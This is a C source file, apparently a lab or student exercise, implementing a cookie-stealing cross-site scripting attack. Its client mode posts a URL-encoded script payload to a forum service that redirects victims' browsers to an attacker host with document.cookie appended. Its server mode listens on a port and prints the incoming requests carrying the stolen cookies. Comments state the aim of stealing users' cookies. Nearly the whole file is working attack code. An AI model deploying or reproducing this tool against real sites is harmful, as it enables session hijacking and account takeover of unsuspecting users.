#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
/*
    1. Connect to a server and send a post request containing javascript
        * Javascript will be document.location = "https://www.example.com" + document.cookie with script tags
    2. connect to my server which will display the cookie once the get request is received
*/
int parse_args(int, char **);
int client_mode(char *host1, short port1, char *host2, short port2);
int server_mode(short port);

char URL[2048];
int main(int argc, char **argv)
{

    if (argc == 3 || argc == 6)
    {
        parse_args(argc, argv);
    }
    else
    {
        fprintf(stderr, "Usage: client_mode: client hostname port hostname port\nserver_mode: server port\n");
        exit(EXIT_FAILURE);
    }
    return 0;
}

/*
    0 on success
    1 on failure
*/
int parse_args(int argc, char **argv)
{
    const char *client = "client";
    const char *server = "server";
    /*
        argv[1] = client/server
    */

    if (strncmp(argv[1], client, strlen(client)) == 0)
    {
        /*
            Client branch
        */
        client_mode(argv[2], atoi(argv[3]), argv[4], atoi(argv[5]));
    }
    else if (strncmp(argv[1], server, strlen(server)) == 0)
    {
        /*
            Server branch
        */
        server_mode(atoi(argv[2]));
        printf("Server success\n");
    }
    else
    {
        printf("Fellout\n");
    }

    return 0;
}

int client_mode(char *host1, short port1, char *host2, short port2)
{
    int sockfd = -1;
    int status;
    ssize_t size;
    int exitcode = EXIT_FAILURE;
    struct addrinfo hints = {.ai_socktype = SOCK_STREAM};
    struct addrinfo *servinfo = NULL;
    struct addrinfo *p;
    char buf[BUFSIZ];
    /*
        Create a post request with sprintf
    */
    unsigned int messageSize = 0;
    /*
        <script>document.location =x
        'http://localhost:8081/steal?' Do i need steal? try with and without
        + document.cookie</script>
        This is my message[1024] var

    */
    char message[1024] = "%3Cscript%3Edocument.location %3D %27http%3A%2F%2F";
    char post[2048] = "POST /put HTTP/1.1\r\nHost: localhost:1044\r\nContent-type: application/x-www-form-urlencoded\r\nContent-Length: ";
    messageSize += strlen(message);
    messageSize += sprintf(message + strlen(message), "%s:%hd", host1, port2);
    char messageCont[128] = "%2F%27 %2B document.cookie%3C%2Fscript%3E"; // maybe add steal?' after %2f?
    /* Get message size and finish message */
    messageSize += sprintf(message + strlen(message), "%s", messageCont);
    /* Finish post request header */
    sprintf(post + strlen(post), "%d\r\nConnection: close\r\n\r\n", messageSize + 5);
    /* Add KVP of data=message */
    sprintf(post + strlen(post), "data=%s", message);
    /* send this to the server use mongoose, capture and print response */

    sprintf(URL, "%s:%d", host1, port1);

    /* Change port1 into a char* for getaddrinf() */
    char charPort[16];
    sprintf(charPort, "%hd", port1);

    status = getaddrinfo(host1, charPort, &hints, &servinfo);

    if (0 != status)
    {
        fprintf(stderr, "Error opening connection: %s\n", gai_strerror(status));
        goto done;
    }
    /* Connect to host; first option that works wins. */
    for (p = servinfo; p != NULL; p = p->ai_next)
    {
        sockfd = socket(p->ai_family, p->ai_socktype, 0);
        if (-1 == sockfd)
        {
            continue;
        }

        if (-1 == connect(sockfd, p->ai_addr, p->ai_addrlen))
        {
            close(sockfd);
            sockfd = -1;
            continue;
        }

        break;
    }

    if (-1 == sockfd)
    {
        fprintf(stderr, "failed to connect\n");
        goto done;
    }

    ssize_t sent = send(sockfd, post, strlen(post), 0);
    if (sent <= 0)
    {
        printf("error\n");
    }

    /* Read all bytes from host, and write them to stdout. */
    for (;;)
    {
        size = recv(sockfd, buf, BUFSIZ - 1, 0);
        if (strstr(buf, "\r\n\r\n") != NULL)
        {
            write(STDOUT_FILENO, buf, size);
            printf("\n");
            break;
        }
        else
        {
            perror("error reading from socket");
            goto done;
        }
    }



    exitcode = EXIT_SUCCESS;

done:
    if (-1 != sockfd)
    {
        close(sockfd);
    }

    if (NULL != servinfo)
    {
        freeaddrinfo(servinfo);
    }

    exit(exitcode);
    return 0;
}

/*
    host1port1 will connect to the service hosting a fourm.
    Send a post request with script injection here (Maybe use mongoose)
    host2port2 will connect to my server and steal their cookies.
*/
int server_mode(short port)
{
    /* Copy over port listener */
    short listenPort = port;
    char inBuf[BUFSIZ];
    int exitcode = EXIT_FAILURE;
    struct sockaddr_in addr = {0};
    int sockfd = -1, connfd = -1, yes = 1, rc;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (-1 == sockfd)
    {
        perror("error creating listening socket");
        goto done;
    }
    rc = setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));
    if (-1 == rc)
    {
        perror("error setting socket option");
        goto done;
    }
    addr.sin_port = htons(listenPort);
    addr.sin_family = PF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    rc = bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    if (-1 == rc)
    {
        perror("error binding listening socket to port");
        goto done;
    }
    rc = listen(sockfd, 0);
    if (-1 == rc)
    {
        perror("failed to listen");
        goto done;
    }
    connfd = accept(sockfd, NULL, NULL);
    if (-1 == connfd)
    {
        perror("failed to accept");
        goto done;
    }

    char *strstrVar;
    for (;;)
    {
        ssize_t size = recv(connfd, inBuf, sizeof(inBuf), 0);
        switch (size)
        {
        case 0:
            exitcode = EXIT_SUCCESS;
            goto done;
        case -1:
            perror("error writing");
            goto done;
        default:
            write(STDOUT_FILENO, inBuf, size);
            if((strstrVar = strstr(inBuf, "\r\n\r\n")) != NULL) {
                break;
            }
        }
        if(strstrVar != NULL) {
            break;
        }
    }

done:
    if (-1 != sockfd)
    {
        close(sockfd);
    }
    if (-1 != connfd)
    {
        close(connfd);
    }
    exit(exitcode);

    return 0;
}
